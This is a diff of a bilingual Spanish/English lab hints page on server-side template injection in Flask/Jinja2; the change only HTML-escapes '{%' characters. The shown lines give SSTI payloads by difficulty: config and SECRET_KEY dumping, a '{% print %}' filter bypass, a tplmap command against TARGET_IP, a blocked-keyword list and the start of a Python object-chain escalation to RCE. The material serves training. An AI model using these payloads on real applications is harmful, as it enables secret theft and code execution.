@@ -36,11 +36,11 @@
         <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → configuración Flask
 {{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
-      <li><strong>Medium:</strong> Bloquea <code>{{ "{{" }} {{ "}}" }}</code> pero permite <code>{%25 %25}</code>. Bypass:
-        <pre>{%25 print 7*7 %25}                    → 49
-{%25 print config %25}                 → configuración Flask
-{%25 print config.SECRET_KEY %25}</pre></li>
-      <li><strong>Hard:</strong> Bloquea <code>{{ "{{" }}</code>, <code>{%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Usa herramientas automatizadas:
+      <li><strong>Medium:</strong> Bloquea <code>{{ "{{" }} {{ "}}" }}</code> pero permite <code>&#123;%25 %25&#125;</code>. Bypass:
+        <pre>&#123;%25 print 7*7 %25&#125;                    → 49
+    &#123;%25 print config %25&#125;                 → configuración Flask
+    &#123;%25 print config.SECRET_KEY %25&#125;</pre></li>
+      <li><strong>Hard:</strong> Bloquea <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Usa herramientas automatizadas:
         <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
       <li>Escala al RCE (Easy) recorriendo la cadena de objetos Python:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
@@ -58,11 +58,11 @@
         <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → Flask config object
 {{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
-      <li><strong>Medium:</strong> Blocks <code>{{ "{{" }} {{ "}}" }}</code> but allows <code>{%25 %25}</code>. Bypass:
-        <pre>{%25 print 7*7 %25}                    → 49
-{%25 print config %25}                 → Flask config object
-{%25 print config.SECRET_KEY %25}</pre></li>
-      <li><strong>Hard:</strong> Blocks <code>{{ "{{" }}</code>, <code>{%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Use automated tools:
+      <li><strong>Medium:</strong> Blocks <code>{{ "{{" }} {{ "}}" }}</code> but allows <code>&#123;%25 %25&#125;</code>. Bypass:
+        <pre>&#123;%25 print 7*7 %25&#125;                    → 49
+    &#123;%25 print config %25&#125;                 → Flask config object
+    &#123;%25 print config.SECRET_KEY %25&#125;</pre></li>
+      <li><strong>Hard:</strong> Blocks <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Use automated tools:
         <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
       <li>Escalate to RCE (Easy) by traversing Python's object hierarchy:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
